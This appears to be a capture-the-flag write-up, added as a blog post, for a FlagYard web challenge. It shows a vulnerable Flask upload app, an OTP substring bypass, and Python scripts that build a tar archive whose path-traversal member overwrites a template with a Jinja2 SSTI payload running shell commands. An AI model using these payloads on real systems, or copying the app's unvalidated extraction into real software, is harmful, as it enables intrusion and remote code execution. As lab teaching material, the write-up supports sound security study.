@@ -1,0 +1,311 @@
+---
+title: FlagYard - Web - Glide
+date: '2025-02-06'
+tags: ['Path Traversal', 'SSTI', 'WEB', 'Exploitation', 'RCE', 'File Upload Vulnerbility', 'Extract Vulnerbility']
+draft: false
+summary: Exploiting path traversal in a tar file extraction process to overwrite a rendered template, leading to Server-Side Template Injection (SSTI) and ultimately achieving Remote Code Execution (RCE)
+---
+
+# Challenge Description
+
+> _Ice skating? Slide!_
+
+```
+from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
+import os
+import random
+import string
+import time
+import tarfile
+from werkzeug.utils import secure_filename
+
+app = Flask(__name__)
+app.secret_key = "secretkeyplaceheolder"
+
+def generate_otp():
+    otp = ''.join(random.choices(string.digits, k=4))
+    return otp
+
+if not os.path.exists('uploads'):
+   os.makedirs('uploads')
+
+@app.route('/', methods=['GET', 'POST'])
+def main():
+    if 'username' not in session or 'otp_validated' not in session:
+        return redirect(url_for('login'))
+
+    if request.method == 'POST':
+        uploaded_file = request.files['file']
+        if uploaded_file.filename != '':
+            filename = secure_filename(uploaded_file.filename)
+            file_path = os.path.join('uploads', filename)
+            uploaded_file.save(file_path)
+            session['file_path'] = file_path
+            return redirect(url_for('extract'))
+        else:
+            return render_template('index.html', message='No file selected')
+    
+    return render_template('index.html', message='')
+
+@app.route('/extract')
+def extract():
+    if 'file_path' not in session:
+        return redirect(url_for('login'))
+
+    file_path = session['file_path']
+    output_dir = 'uploads'
+    if not tarfile.is_tarfile(file_path):
+        os.remove(file_path)
+        return render_template('extract.html', message='The uploaded file is not a valid tar archive')
+
+    with tarfile.open(file_path, 'r') as tar_ref:
+        tar_ref.extractall(output_dir)
+        os.remove(file_path)
+
+    return render_template('extract.html', files=os.listdir(output_dir))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        if username == 'admin' and password == 'admin':
+            session['username'] = username
+            return redirect(url_for('otp'))
+        else:
+            return render_template('login.html', message='Invalid username or password')
+    return render_template('login.html', message='')
+
+@app.route('/otp', methods=['GET', 'POST'])
+def otp():
+    if 'username' not in session:
+        return redirect(url_for('login'))
+
+    if request.method == 'POST':
+        otp,_otp = generate_otp(),request.form['otp']
+        if otp in _otp:
+            session['otp_validated'] = True
+            return redirect(url_for('main'))
+        else:
+            time.sleep(10) # please don't bruteforce my OTP
+            return render_template('otp.html', message='Invalid OTP')
+    return render_template('otp.html', message='')
+
+@app.route('/logout')
+def logout():
+    session.pop('username', None)
+    session.pop('otp_validated', None)
+    session.pop('file_path', None)
+    return redirect(url_for('login'))
+
+
+@app.route('/uploads/<path:filename>')
+def uploaded_file(filename):
+    uploads_path = os.path.join(app.root_path, 'uploads')
+    return send_from_directory(uploads_path, filename)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+
+The functionality of this web app is simple:
+
+- First, you need to log in.
+- Once logged in, you can upload a .tar file.
+- As soon as the file is uploaded, it will be extracted automatically.
+
+
+That's all! Now, let's get started.
+
+The first step is to log in successfully, which requires a username and password.
+
+By checking the source code, we can see that the app compares our input with a hardcoded username and password. 
+
+```
+if username == 'admin' and password == 'admin':
+            session['username'] = username
+            return redirect(url_for('otp'))
+```
+
+After entering the credentials, we are redirected to the /otp endpoint, where we are asked to enter a one-time password (OTP). However, we don’t know the OTP.
+
+So, let's check how the web app is generating the OTP.
+
+```
+def generate_otp():
+    otp = ''.join(random.choices(string.digits, k=4))
+    return otp
+```
+
+Here, we can see that the OTP is generated randomly with a length of 4 digits. Now, let's check how the web app is validating or comparing the OTP with our input.
+
+### `/otp route`
+
+```
+@app.route('/otp', methods=['GET', 'POST'])
+def otp():
+    if 'username' not in session:
+        return redirect(url_for('login'))
+
+    if request.method == 'POST':
+        otp,_otp = generate_otp(),request.form['otp']
+        if otp in _otp:
+            session['otp_validated'] = True
+            return redirect(url_for('main'))
+        else:
+            time.sleep(10) # please don't bruteforce my OTP
+            return render_template('otp.html', message='Invalid OTP')
+    return render_template('otp.html', message='')
+```
+
+The if statement checks if the generated OTP is present anywhere in our input.
+
+For example, if the OTP is `6434`, we can bypass the check by entering a string that contains all possible 4-digit combinations. For instance, inputting `23498364348573` will pass the check because `6434` is inside it. This allows us to successfully log in. 
+
+Let's create a Python script to generate every possible 4-digit combination.
+
+```
+print("".join(f"{a}{b}{c}{d}" for a in range(10) for b in range(10) for c in range(10) for d in range(10)))
+```
+
+We will be logged in successfully.
+
+Now, we can upload a .tar file, which will be automatically extracted after upload.
+
+Unlike the `Studio` challenge in FlagYard, where a custom function was used to check the filename for path traversal or other security risks, this challenge uses the built-in `secure_filename()` function, which cannot be bypassed.
+
+This means path traversal is not possible through the tar filename. However, we can exploit the files inside the tar archive. Since the extraction process does not validate filenames using `secure_filename()`, we can leverage this vulnerability to achieve `path traversal` and upload a malicious file. This can further lead to `server-side template injection (SSTI)`, ultimately resulting in `remote code execution (RCE)`.
+
+Let's create a Python script that generates a tar archive containing a malicious file. This file will include Server-Side Template Injection (SSTI) along with path traversal techniques.
+
+When the tar file is extracted, the malicious file inside it will have a path traversal filename, causing it to be extracted into a specific location on the server. This allows us to manipulate the file placement and potentially execute malicious code. In this case, we target extract.html, ensuring that the malicious payload is executed when the page is accessed.
+
+```
+# import tarfile
+# import os
+
+# # Create a directory for the malicious payload
+# os.makedirs("malicious_payload", exist_ok=True)
+
+# # Define the malicious file and its content
+# malicious_file = "malicious_payload/exploit.txt"
+# with open(malicious_file, "w") as f:
+#     f.write("This is a test for directory traversal.\n")
+
+# # Define the target path for traversal (e.g., ../../flag.txt)
+# # The number of "../" depends on the directory depth in the server.
+# traversal_path = "../../flag.txt"
+
+# # Create the malicious tar.gz archive
+# with tarfile.open("file.tar.gz", "w:gz") as tar:
+#     # Add the malicious file with the directory traversal path
+#     tar.add(malicious_file, arcname=traversal_path)
+
+# print("[+] Malicious tar.gz file 'file.tar.gz' created successfully.")
+
+
+import tarfile
+import os
+
+# Create a directory for the malicious payload
+os.makedirs("malicious_payload", exist_ok=True)
+
+# Define the malicious HTML file and its content
+malicious_file = "malicious_payload/extract.html"
+html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>You've been exploited!</h1>
+    <p>{{7*7}}</p>
+    <textarea type="text" rows="40" cols="50" id="page" name="page" >{{7*7}}</textarea>
+</body>
+</html>
+"""
+with open(malicious_file, "w") as f:
+    f.write(html_content)
+
+# Define the target path for traversal (e.g., ../../extract.html)
+# Adjust the number of "../" to match the directory depth on the server.
+traversal_path = "../templates/extract.html"
+
+with tarfile.open("file.tar.gz", "w:gz") as tar:
+    tar.add(malicious_file, arcname=traversal_path)
+
+print("[+] Malicious tar.gz created successfully.")
+```
+
+After uploading the malicious tar file, we successfully exploited the path traversal, causing our malicious file with SSTI to be rendered.
+
+Now, as the final step, use this `SSTI payload` to achieve `Remote Code Execution (RCE)`:
+
+```
+{{config.__class__.__init__.__globals__['os'].popen('ls -l /app').read()}}
+```
+
+Below is the final Python script for generating the malicious tar file.
+
+```
+# import tarfile
+# import os
+
+# # Create a directory for the malicious payload
+# os.makedirs("malicious_payload", exist_ok=True)
+
+# # Define the malicious file and its content
+# malicious_file = "malicious_payload/exploit.txt"
+# with open(malicious_file, "w") as f:
+#     f.write("This is a test for directory traversal.\n")
+
+# # Define the target path for traversal (e.g., ../../flag.txt)
+# # The number of "../" depends on the directory depth in the server.
+# traversal_path = "../../flag.txt"
+
+# # Create the malicious tar.gz archive
+# with tarfile.open("file.tar.gz", "w:gz") as tar:
+#     # Add the malicious file with the directory traversal path
+#     tar.add(malicious_file, arcname=traversal_path)
+
+# print("[+] Malicious tar.gz file 'file.tar.gz' created successfully.")
+
+
+import tarfile
+import os
+
+# Create a directory for the malicious payload
+os.makedirs("malicious_payload", exist_ok=True)
+
+# Define the malicious HTML file and its content
+malicious_file = "malicious_payload/extract.html"
+html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>You've been exploited!</h1>
+    <p>{{7*7}}</p>
+    <textarea type="text" rows="40" cols="50" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('cat $(find / -name flag.txt 2>/dev/null)').read()}}</textarea>
+</body>
+</html>
+"""
+with open(malicious_file, "w") as f:
+    f.write(html_content)
+
+# Define the target path for traversal (e.g., ../../extract.html)
+# Adjust the number of "../" to match the directory depth on the server.
+traversal_path = "../templates/extract.html"
+
+with tarfile.open("file.tar.gz", "w:gz") as tar:
+    tar.add(malicious_file, arcname=traversal_path)
+
+print("[+] Malicious tar.gz file 'file.tar.gz' created successfully with extract.html content.")
+```
+
+With this crafted malicious tar file, we have successfully leveraged `path traversal` and `SSTI` to achieve `Remote Code Execution (RCE)``. This demonstrates how improper file extraction handling can lead to severe security vulnerabilities.
+
+See you next time with another exploitive adventure. Good Bye!
